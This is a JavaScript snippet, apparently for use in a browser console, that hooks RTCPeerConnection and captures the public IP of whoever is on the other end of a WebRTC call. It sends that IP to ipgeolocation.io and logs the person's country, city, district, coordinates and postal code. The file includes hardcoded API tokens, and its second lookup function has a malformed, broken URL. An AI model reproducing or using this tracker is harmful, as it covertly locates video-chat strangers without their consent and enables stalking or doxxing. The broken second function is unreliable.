let apiKey = "21dfa35d0a1d4de5b201f7f12e0d350e";
var ip;
window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    console.log(iceCandidate.candidate);
     ip = fields[4];
    if (fields[7] === "srflx") {
      getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};
let getLocation = async (ip) => {
  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          Country: ${json.country_name}
          State: ${json.state_prov}
          City: ${json.city}
          District: ${json.district}
          Lat / Long: (${json.latitude}, ${json.longitude})
          IP: ${json.ip}
          Postal : ${json.zipcode}
          
          ---------------------
          `;
      console.log(output);
    })
  );
};


let getLocation2 = async (ip) => {
  let url = `pinfo.io/[ip]?token=4d5b04326ec6f0`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
          ---------------------
          Country: ${json.country}
          City: ${json.city}
          Region: ${json.region}
          Location: ${json.loc} 
	  Postal : ${json.postal}
          IP: ${json.ip}
          
          ---------------------
          `;
      console.log(output);
    })
  );
};
